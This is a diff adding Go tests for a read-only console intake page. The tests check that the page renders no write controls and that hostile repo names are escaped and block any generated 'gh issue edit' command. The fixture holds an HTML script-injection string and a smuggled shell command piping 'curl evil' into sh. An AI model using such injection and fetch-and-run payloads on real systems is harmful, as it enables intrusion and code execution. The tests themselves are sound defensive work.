@@ -697,3 +697,155 @@ func TestConsoleIntakeEmptyStateExplainsScanCycle(t *testing.T) {
 		}
 	}
 }
+
+// READ-ONLY BOUNDARY: the intake surface — full page, fragment, and an open
+// unblock drawer — must carry zero write affordances. The unblock section is
+// selectable copy-paste text, never a control; the only governed write route
+// (/ops/hive/model-policy) must not leak here in any form. Card-open buttons
+// and the drawer close button are legitimately type="button" and are NOT
+// asserted absent — only form/hx-write/submit/write-route markers are.
+func TestConsoleIntakeSurfaceRendersNoWriteControls(t *testing.T) {
+	hiveSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "application/json")
+		_, _ = io.WriteString(w, hiveCivilizationAssemblyProjectionFixture)
+	}))
+	defer hiveSrv.Close()
+	t.Setenv("HIVE_OPS_API_BASE_URL", hiveSrv.URL)
+
+	h := newConsoleTestHandlers()
+	mux := http.NewServeMux()
+	h.Register(mux)
+
+	bodies := map[string]string{}
+	for name, target := range map[string]string{
+		"page":     "http://site.test/console/intake",
+		"fragment": "http://site.test/console/intake/fragment",
+		// run_docs_172_scope / select_and_design_approach is the fixture card
+		// whose gate passes: its unblock section renders real commands, so
+		// this is the strongest case for a leaked write control.
+		"drawer": "http://site.test/console/intake/card?run=run_docs_172_scope&stage=select_and_design_approach",
+	} {
+		req := httptest.NewRequest(http.MethodGet, target, nil)
+		w := httptest.NewRecorder()
+		mux.ServeHTTP(w, req)
+		if w.Code != http.StatusOK {
+			t.Fatalf("%s: status = %d", name, w.Code)
+		}
+		bodies[name] = w.Body.String()
+	}
+
+	// Sanity: the drawer actually rendered the unblock command, so a passing
+	// no-write-controls assertion below isn't vacuous (nothing to leak).
+	if !strings.Contains(bodies["drawer"], "gh issue edit 172 --repo transpara-ai/docs") {
+		t.Fatal("drawer fixture must render the unblock command, or this test proves nothing")
+	}
+
+	for name, body := range bodies {
+		lower := strings.ToLower(body)
+		for _, forbidden := range []string{
+			"<form", "hx-post", "hx-put", "hx-delete", "hx-patch",
+			`type="submit"`, "/ops/hive/model-policy",
+		} {
+			if strings.Contains(lower, strings.ToLower(forbidden)) {
+				t.Errorf("%s: read-only intake surface must not render %q", name, forbidden)
+			}
+		}
+	}
+}
+
+// Hostile projection data must neither escape into markup nor produce a
+// command. Two hostile target repos share one run each: one carries HTML
+// injection, the other shell metacharacters. consoleUnblockRepoPattern is a
+// strict owner/repo allowlist (graph/console_unblock.go), so both refuse to
+// render ANY command — this asserts the fail-closed GATE, not just escaping.
+func TestConsoleIntakeUnblockGateRefusesHostileData(t *testing.T) {
+	const runHTML = "run_hostile_html_226"
+	const runShell = "run_hostile_shell_226"
+	const stageHTML = "select_and_design_approach"
+	const stageShell = "select_and_design_approach"
+	const repoHTML = `transpara-ai/docs"><script>alert(1)</script>`
+	const repoShell = `transpara-ai/docs; curl evil|sh`
+
+	fixture := fmt.Sprintf(`{
+		"projection_schema_version": "1.0.0",
+		"projection_subject": "civilization_assembly",
+		"derivation_status": "complete",
+		"generated_at": %q,
+		"issue_scan_projection": {
+			"runs": [
+				{
+					"run_id": %q,
+					"state": "human_action",
+					"target_issue": {"repo": %q, "number": 226, "labels": ["cc:needs-human-scope"]}
+				},
+				{
+					"run_id": %q,
+					"state": "human_action",
+					"target_issue": {"repo": %q, "number": 226, "labels": ["cc:needs-human-scope"]}
+				}
+			],
+			"stages": [
+				{"run_id": %q, "stage_id": %q, "current_state": "human_action"},
+				{"run_id": %q, "stage_id": %q, "current_state": "human_action"}
+			],
+			"blockers": [
+				{"run_id": %q, "stage_id": %q, "blocker_type": "needs_human_scope", "required_action": "human must clarify issue scope"},
+				{"run_id": %q, "stage_id": %q, "blocker_type": "needs_human_scope", "required_action": "human must clarify issue scope"}
+			]
+		}
+	}`,
+		time.Now().UTC().Format(time.RFC3339),
+		runHTML, repoHTML,
+		runShell, repoShell,
+		runHTML, stageHTML,
+		runShell, stageShell,
+		runHTML, stageHTML,
+		runShell, stageShell,
+	)
+
+	hiveSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "application/json")
+		_, _ = io.WriteString(w, fixture)
+	}))
+	defer hiveSrv.Close()
+	t.Setenv("HIVE_OPS_API_BASE_URL", hiveSrv.URL)
+
+	h := newConsoleTestHandlers()
+	mux := http.NewServeMux()
+	h.Register(mux)
+
+	get := func(target string) string {
+		req := httptest.NewRequest(http.MethodGet, target, nil)
+		w := httptest.NewRecorder()
+		mux.ServeHTTP(w, req)
+		if w.Code != http.StatusOK {
+			t.Fatalf("%s: status = %d", target, w.Code)
+		}
+		return w.Body.String()
+	}
+
+	pageBody := get("http://site.test/console/intake")
+	drawerHTML := get("http://site.test/console/intake/card?run=" + url.QueryEscape(runHTML) + "&stage=" + url.QueryEscape(stageHTML))
+	drawerShell := get("http://site.test/console/intake/card?run=" + url.QueryEscape(runShell) + "&stage=" + url.QueryEscape(stageShell))
+	combined := pageBody + drawerHTML + drawerShell
+
+	if strings.Contains(combined, "<script>alert") {
+		t.Error("raw <script>alert survived escaping in the intake surface")
+	}
+	// "gh issue edit" must be absent everywhere: the gate refuses to build ANY
+	// command for a hostile repo, so neither hostile payload (the HTML
+	// injection nor "curl evil|sh") can ever appear inside a gh command. This
+	// is the gate assertion the brief calls for. The repo string legitimately
+	// still renders as escaped, read-only display text elsewhere on the
+	// card/drawer (e.g. the "Issue" field) — that is not a command and is not
+	// asserted absent here.
+	if strings.Contains(combined, "gh issue edit") {
+		t.Error("gate must refuse ANY command for a hostile repo — repo pattern is a strict owner/repo allowlist")
+	}
+	if !strings.Contains(pageBody, "&lt;script") {
+		t.Error(`expected escaped form "&lt;script" in page output; escaping did not occur`)
+	}
+	if strings.Contains(strings.ToLower(combined), "unblock available") {
+		t.Error(`"unblock available" hint must be suppressed too — the gate refused, so UnblockAvailable must be false`)
+	}
+}
